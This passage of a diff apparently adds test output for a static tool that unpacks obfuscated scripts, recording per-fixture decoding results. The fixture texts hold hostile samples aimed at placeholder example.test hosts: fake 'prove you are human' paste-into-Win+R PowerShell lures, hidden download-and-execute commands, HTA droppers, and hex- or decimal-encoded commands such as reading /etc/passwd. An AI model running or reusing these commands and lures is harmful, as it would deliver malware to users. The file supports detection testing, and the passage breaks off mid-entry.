+      "implementation": "reference",
+      "latency_ms": 0.0029139919206500053,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 44,
+      "final_sha256": "bace661a15a6553bbf493be601f476f89027a1b414ab2aeaef562ca547e7f46f",
+      "final_text": "$a=[char[]](109,115,104,116,97); $a -join ''",
+      "fixture_id": "corpus_char_arrays_005",
+      "implementation": "reference",
+      "latency_ms": 0.0037679565139114857,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 139,
+      "final_sha256": "b1c3613d85daabd66d0d3798c00483335a2987bd4a8829f4cc9d06dd4a9fd57f",
+      "final_text": "# Please press Win+R and paste to prove you are human\npowershell -w hidden -c \"iex (iwr 'http://clickfix-1.example.test/verify.hta' -useb)\"",
+      "fixture_id": "corpus_clickfix_001",
+      "implementation": "reference",
+      "latency_ms": 0.01276994589716196,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 140,
+      "final_sha256": "759045ad6730d83c8abc0a616b52fe2fbdc17b9bf0b744b3d330535630c65ef8",
+      "final_text": "# Please press Win+R and paste to prove you are human\npowershell -w hidden -c \"iex (iwr 'http://clickfix-2.example.test/captcha.ps1' -useb)\"",
+      "fixture_id": "corpus_clickfix_002",
+      "implementation": "reference",
+      "latency_ms": 0.011602998711168766,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 143,
+      "final_sha256": "537daeb4a1f4076e3c16e9598bb43d2043725285682984fbc40e1e3caf1b1988",
+      "final_text": "# Please press Win+R and paste to prove you are human\npowershell -w hidden -c \"iex (iwr 'http://clickfix-3.example.test/human-check.js' -useb)\"",
+      "fixture_id": "corpus_clickfix_003",
+      "implementation": "reference",
+      "latency_ms": 0.011705036740750074,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 138,
+      "final_sha256": "00ab73ca98e69604a1f66df5aa6ca03e944e1a8acf9dbe0c51b42fb28604bd77",
+      "final_text": "# Please press Win+R and paste to prove you are human\npowershell -w hidden -c \"iex (iwr 'http://clickfix-4.example.test/robot.hta' -useb)\"",
+      "fixture_id": "corpus_clickfix_004",
+      "implementation": "reference",
+      "latency_ms": 0.011917960364371538,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 138,
+      "final_sha256": "80c93a927a9223caa769e0ac36e69b6bf2526bc31121e1bd04a785a365a62b79",
+      "final_text": "# Please press Win+R and paste to prove you are human\npowershell -w hidden -c \"iex (iwr 'http://clickfix-5.example.test/steps.ps1' -useb)\"",
+      "fixture_id": "corpus_clickfix_005",
+      "implementation": "reference",
+      "latency_ms": 0.011235999409109354,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 67,
+      "final_sha256": "328ca3317c1417cad1a84659b9af2cd1eb6fa99bb155c5306c82ad3f4104d17a",
+      "final_text": "105,100,59,119,104,111,97,109,105,59,104,111,115,116,110,97,109,101",
+      "fixture_id": "corpus_decimal_ascii_001",
+      "implementation": "reference",
+      "latency_ms": 0.004430999979376793,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 52,
+      "final_sha256": "9dc16c8ac428de93ea549631e85bb9255f20de271e72567f671791643dcac5d5",
+      "final_text": "99,97,116,32,47,101,116,99,47,112,97,115,115,119,100",
+      "fixture_id": "corpus_decimal_ascii_002",
+      "implementation": "reference",
+      "latency_ms": 0.0034800032153725624,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 153,
+      "final_sha256": "533d8fea5b171df11684507d788270735ff5923917f83fa7f9a7d8599854ab45",
+      "final_text": "71,101,116,45,80,114,111,99,101,115,115,32,124,32,87,104,101,114,101,45,79,98,106,101,99,116,32,78,97,109,101,32,45,101,113,32,110,111,116,101,112,97,100",
+      "fixture_id": "corpus_decimal_ascii_003",
+      "implementation": "reference",
+      "latency_ms": 0.010183954145759344,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 96,
+      "final_sha256": "52c861d1d1ed2f680daa3201fc7def459939e49ceebe342f9fc9ddba5bd4064a",
+      "final_text": "73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110,32,39,98,101,110,105,103,110,39",
+      "fixture_id": "corpus_decimal_ascii_004",
+      "implementation": "reference",
+      "latency_ms": 0.005984969902783632,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "47e84b5efbd673bce97a1598be8c328aa7c27338d03927b647f0b1664718f703",
+      "final_text": "99,117,114,108,32,104,116,116,112,58,47,47,100,101,99,49,45,101,120,97,109,112,108,101,46,116,101,115,116,47,120",
+      "fixture_id": "corpus_decimal_ascii_005",
+      "implementation": "reference",
+      "latency_ms": 0.006901973392814398,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 9,
+      "final_sha256": "58aa521a66865385ac86fcc76af092753ea758a1ee3959ff69156a9ae677ad7d",
+      "final_text": "[raw:30b]",
+      "fixture_id": "corpus_deflate_base64_001",
+      "implementation": "reference",
+      "latency_ms": 0.0828510383144021,
+      "layer_count": 1,
+      "layer_sequence": [
+        "from_base64_string"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 238,
+          "bytes_out": 72,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 9,
+      "final_sha256": "c5fd08bf2a76e69eccd57528119b93c8c9373003decf345702864c95556544b6",
+      "final_text": "[raw:49b]",
+      "fixture_id": "corpus_deflate_base64_002",
+      "implementation": "reference",
+      "latency_ms": 0.03782100975513458,
+      "layer_count": 1,
+      "layer_sequence": [
+        "from_base64_string"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 266,
+          "bytes_out": 110,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 9,
+      "final_sha256": "702cf37d069dca3eb5e2274846c8e8cf2a7044118ac702316e246ce4c68df0ff",
+      "final_text": "[raw:89b]",
+      "fixture_id": "corpus_deflate_base64_003",
+      "implementation": "reference",
+      "latency_ms": 0.04669098416343331,
+      "layer_count": 1,
+      "layer_sequence": [
+        "from_base64_string"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 318,
+          "bytes_out": 190,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 9,
+      "final_sha256": "5fc10eb888518386104ab21b5e16b1c2e5c148775c3397aab9b998237bbf5179",
+      "final_text": "[raw:61b]",
+      "fixture_id": "corpus_deflate_base64_004",
+      "implementation": "reference",
+      "latency_ms": 0.03688799915835261,
+      "layer_count": 1,
+      "layer_sequence": [
+        "from_base64_string"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 282,
+          "bytes_out": 134,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 9,
+      "final_sha256": "9f2296aa2a5d4a70d4404ab55c27b3047952ba48039b3133d73cc9ae44b4c233",
+      "final_text": "[raw:82b]",
+      "fixture_id": "corpus_deflate_base64_005",
+      "implementation": "reference",
+      "latency_ms": 0.04705297760665417,
+      "layer_count": 1,
+      "layer_sequence": [
+        "from_base64_string"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 310,
+          "bytes_out": 176,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 8,
+      "final_sha256": "82bf569ad97520b02a2847bde5d1b4f01ea245e6a996687201da20aff2a54d92",
+      "final_text": "YVdRPQ==",
+      "fixture_id": "corpus_double_base64_001",
+      "implementation": "reference",
+      "latency_ms": 0.00313599593937397,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 24,
+      "final_sha256": "faa941ce7c22602580a7c8cbac7ecf4baef34def130a4194ef82e20bea22aa95",
+      "final_text": "ZDJodllXMXBJQzl3Y21sMg==",
+      "fixture_id": "corpus_double_base64_002",
+      "implementation": "reference",
+      "latency_ms": 0.0029480434022843838,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 76,
+      "final_sha256": "da6696eb2daa0dc5a3578dc62a8f3516f40df566cdc778bfe572c38f4c2e938c",
+      "final_text": "ZEhsd1pTQkRPbHhYYVc1a2IzZHpYRk41YzNSbGJUTXlYR1J5YVhabGNuTmNaWFJqWEdodmMzUno=",
+      "fixture_id": "corpus_double_base64_003",
+      "implementation": "reference",
+      "latency_ms": 0.00506499782204628,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "2dd77f0d511f46e7cce4485dc50867a2bbec4fcb593c059536b18a22b77946f2",
+      "final_text": "Y21WbklIRjFaWEo1SUNKSVMwTlZYRk52Wm5SM1lYSmxYRTFwWTNKdmMyOW1kRnhYYVc1a2IzZHpYRU4xY25KbGJuUldaWEp6YVc5dVhGSjFiaUk9",
+      "fixture_id": "corpus_double_base64_004",
+      "implementation": "reference",
+      "latency_ms": 0.007093010935932398,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 64,
+      "final_sha256": "f8ee2b997de24dde48836a45277be3b4a560653a4cf987f78dea6684b35ab62b",
+      "final_text": "WTNWeWJDQm9kSFJ3T2k4dll6SXRaWGhoYlhCc1pTNTBaWE4wTDJKbFlXTnZiZz09",
+      "fixture_id": "corpus_double_base64_005",
+      "implementation": "reference",
+      "latency_ms": 0.0051889801397919655,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "2905a37c49d8ffaaeafc135fdc78d3511a46dbc6e473e977812f0bb55dfbe5ea",
+      "final_text": "%COMSPEC% /c powershell -w hidden -c \"iwr 'http://env-1.example.test/x.exe' -o %TEMP%\\p.exe; start %TEMP%\\p.exe\"",
+      "fixture_id": "corpus_env_var_expansion_001",
+      "implementation": "reference",
+      "latency_ms": 0.011904980055987835,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "c4e789073e0e66448e19089f967002a612a715f4df0080788e8c5fba36812ede",
+      "final_text": "%COMSPEC% /c powershell -w hidden -c \"iwr 'http://env-2.example.test/y.exe' -o %TEMP%\\p.exe; start %TEMP%\\p.exe\"",
+      "fixture_id": "corpus_env_var_expansion_002",
+      "implementation": "reference",
+      "latency_ms": 0.010228017345070839,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "228470ebb4e884026c2028e9cb4a57e1ece7c2d15d148d901ee7ea16d108a8c4",
+      "final_text": "%COMSPEC% /c powershell -w hidden -c \"iwr 'http://env-3.example.test/z.exe' -o %TEMP%\\p.exe; start %TEMP%\\p.exe\"",
+      "fixture_id": "corpus_env_var_expansion_003",
+      "implementation": "reference",
+      "latency_ms": 0.00996398739516735,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "961d4d28f4b6823c38c16b6782149f93e99457dcb275e162e5914a000027af96",
+      "final_text": "%COMSPEC% /c powershell -w hidden -c \"iwr 'http://env-4.example.test/a.exe' -o %TEMP%\\p.exe; start %TEMP%\\p.exe\"",
+      "fixture_id": "corpus_env_var_expansion_004",
+      "implementation": "reference",
+      "latency_ms": 0.009841984137892723,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "4c0c660744c8b9e2f0030a5b110e82425b43ba398422c293eb4c6f358ef7796a",
+      "final_text": "%COMSPEC% /c powershell -w hidden -c \"iwr 'http://env-5.example.test/b.exe' -o %TEMP%\\p.exe; start %TEMP%\\p.exe\"",
+      "fixture_id": "corpus_env_var_expansion_005",
+      "implementation": "reference",
+      "latency_ms": 0.009834009688347578,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 20,
+      "final_sha256": "d438dc6e1a69ceeac84040edd269a46adfbd3593906fc8a057ea97747acd432f",
+      "final_text": "\"{1}{0}\" -f 'EX','I'",
+      "fixture_id": "corpus_format_operator_001",
+      "implementation": "reference",
+      "latency_ms": 0.002173997927457094,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 20,
+      "final_sha256": "9f89f2b036a978a6a698122835c6c7bfd6e6a420708291db40978adde5e73604",
+      "final_text": "\"{1}{0}\" -f 'md','c'",
+      "fixture_id": "corpus_format_operator_002",
+      "implementation": "reference",
+      "latency_ms": 0.002107990439981222,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 21,
+      "final_sha256": "4221f7a4f3652349537d8b0d96431199657ba7874830dbd6fba9409b82444714",
+      "final_text": "\"{1}{0}\" -f 'url','c'",
+      "fixture_id": "corpus_format_operator_003",
+      "implementation": "reference",
+      "latency_ms": 0.001954031176865101,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 21,
+      "final_sha256": "980547f10c4d63f1773b7d82835f33d57112c0483ddcc475984f7f7ed51e0caf",
+      "final_text": "\"{1}{0}\" -f 'get','w'",
+      "fixture_id": "corpus_format_operator_004",
+      "implementation": "reference",
+      "latency_ms": 0.0020150328055024147,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 22,
+      "final_sha256": "f03b900188b75f286ead4d735d8b85a72ccfeb6e35601149d4a330e4f77880a5",
+      "final_text": "\"{1}{0}\" -f 'shta','m'",
+      "fixture_id": "corpus_format_operator_005",
+      "implementation": "reference",
+      "latency_ms": 0.0020399456843733788,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 14,
+      "final_sha256": "b74e94290ab8324f54379f1c804e1edeab14ca101074865b5d610c344fd4d649",
+      "final_text": "IEX 'harmless'",
+      "fixture_id": "corpus_gzip_base64_001",
+      "implementation": "reference",
+      "latency_ms": 0.061516009736806154,
+      "layer_count": 2,
+      "layer_sequence": [
+        "from_base64_string",
+        "gzip"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 243,
+          "bytes_out": 80,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        },
+        {
+          "bytes_in": 80,
+          "bytes_out": 14,
+          "layer": 2,
+          "meta_keys": [
+            "bytes_in",
+            "bytes_out",
+            "encoding",
+            "inflation"
+          ],
+          "stage": "gzip"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 78,
+      "final_sha256": "5a3ab7edb1b849c1a215789eea1722bfb71e8b775f9f3636388ad2910f900de3",
+      "final_text": "IEX (New-Object Net.WebClient).DownloadString('http://gz1-example.test/a.ps1')",
+      "fixture_id": "corpus_gzip_base64_002",
+      "implementation": "reference",
+      "latency_ms": 0.06981397746130824,
+      "layer_count": 2,
+      "layer_sequence": [
+        "from_base64_string",
+        "gzip"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 327,
+          "bytes_out": 208,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        },
+        {
+          "bytes_in": 208,
+          "bytes_out": 78,
+          "layer": 2,
+          "meta_keys": [
+            "bytes_in",
+            "bytes_out",
+            "encoding",
+            "inflation"
+          ],
+          "stage": "gzip"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 72,
+      "final_sha256": "c47050790c0339fa0159c2c241ae4c8429095a6df85dbfb004861931b26dfc5e",
+      "final_text": "Start-BitsTransfer -Source 'http://gz2-example.test/dropper.exe' -Dest .",
+      "fixture_id": "corpus_gzip_base64_003",
+      "implementation": "reference",
+      "latency_ms": 0.06785598816350102,
+      "layer_count": 2,
+      "layer_sequence": [
+        "from_base64_string",
+        "gzip"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 319,
+          "bytes_out": 194,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        },
+        {
+          "bytes_in": 194,
+          "bytes_out": 72,
+          "layer": 2,
+          "meta_keys": [
+            "bytes_in",
+            "bytes_out",
+            "encoding",
+            "inflation"
+          ],
+          "stage": "gzip"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 67,
+      "final_sha256": "6d37169c162ce56b506362c57cdd5c4690b49f2bf8aae22cb2ffd57ea8f18b0b",
+      "final_text": "Invoke-WebRequest -Uri 'http://gz3-example.test/beacon' -Method GET",
+      "fixture_id": "corpus_gzip_base64_004",
+      "implementation": "reference",
+      "latency_ms": 0.062094011809676886,
+      "layer_count": 2,
+      "layer_sequence": [
+        "from_base64_string",
+        "gzip"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 311,
+          "bytes_out": 184,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        },
+        {
+          "bytes_in": 184,
+          "bytes_out": 67,
+          "layer": 2,
+          "meta_keys": [
+            "bytes_in",
+            "bytes_out",
+            "encoding",
+            "inflation"
+          ],
+          "stage": "gzip"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 44,
+      "final_sha256": "23e28f5fc787214718b2bf8d010bba4e8fbd268995b0d78c34af4434ee1b3d25",
+      "final_text": "curl -s http://gz4-example.test/loader | iex",
+      "fixture_id": "corpus_gzip_base64_005",
+      "implementation": "reference",
+      "latency_ms": 0.05146401235833764,
+      "layer_count": 2,
+      "layer_sequence": [
+        "from_base64_string",
+        "gzip"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 283,
+          "bytes_out": 140,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "raw_len"
+          ],
+          "stage": "from_base64_string"
+        },
+        {
+          "bytes_in": 140,
+          "bytes_out": 44,
+          "layer": 2,
+          "meta_keys": [
+            "bytes_in",
+            "bytes_out",
+            "encoding",
+            "inflation"
+          ],
+          "stage": "gzip"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 26,
+      "final_sha256": "d8680d1fa5e4dbe4fce653dd990f94f17ecc33a81bf518e65712fcf1c00726ec",
+      "final_text": "48656c6c6f2c20576f726c6421",
+      "fixture_id": "corpus_hex_bytes_001",
+      "implementation": "reference",
+      "latency_ms": 0.002416956704109907,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 18,
+      "final_sha256": "c9be36ae09278d22d69912fe1d882a7e057b6623da29b71073471425210e38a8",
+      "final_text": "69643b77686f616d69",
+      "fixture_id": "corpus_hex_bytes_002",
+      "implementation": "reference",
+      "latency_ms": 0.0020450097508728504,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 28,
+      "final_sha256": "3be22e22b72cbae7895ab8baf72d9a0f0e59ccd555a5b810fdb4b2e5f407129b",
+      "final_text": "49455820276861726d6c65737327",
+      "fixture_id": "corpus_hex_bytes_003",
+      "implementation": "reference",
+      "latency_ms": 0.0022570020519196987,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 60,
+      "final_sha256": "670ba9912acfe0fe1c682fc15d29c1942d88624371eedaf6f49a31b1e135723c",
+      "final_text": "6375726c20687474703a2f2f6878312d6578616d706c652e746573742f78",
+      "fixture_id": "corpus_hex_bytes_004",
+      "implementation": "reference",
+      "latency_ms": 0.003890017978847027,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 70,
+      "final_sha256": "3843c7fdaf81834e4c1034a0b75128d47d204d10b42121a969d8485b69dfac28",
+      "final_text": "6d7368746120687474703a2f2f6878322d6578616d706c652e746573742f792e687461",
+      "fixture_id": "corpus_hex_bytes_005",
+      "implementation": "reference",
+      "latency_ms": 0.0042539904825389385,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "723cd31a5a0b8f29addf7ef34ad0482685c4cb177279ae7f002c3171c9d014f5",
+      "final_text": "<html><head><HTA:APPLICATION APPLICATIONNAME='X' /><script>new ActiveXObject('WScript.Shell').Run('powershell -w hidden -c iwr http://hta-1.example.test/beacon')</script></head></html>",
+      "fixture_id": "corpus_hta_javascript_001",
+      "implementation": "reference",
+      "latency_ms": 0.01488695852458477,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 189,
+      "final_sha256": "36e6a481e7a427a29d1d474a855872e2e4cfd488ec03ab6575b16be9fbf8da78",
+      "final_text": "<html><head><HTA:APPLICATION APPLICATIONNAME='X' /><script>new ActiveXObject('WScript.Shell').Run('powershell -w hidden -c iwr http://hta-2.example.test/dropper.exe')</script></head></html>",
+      "fixture_id": "corpus_hta_javascript_002",
+      "implementation": "reference",
+      "latency_ms": 0.026530004106462002,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
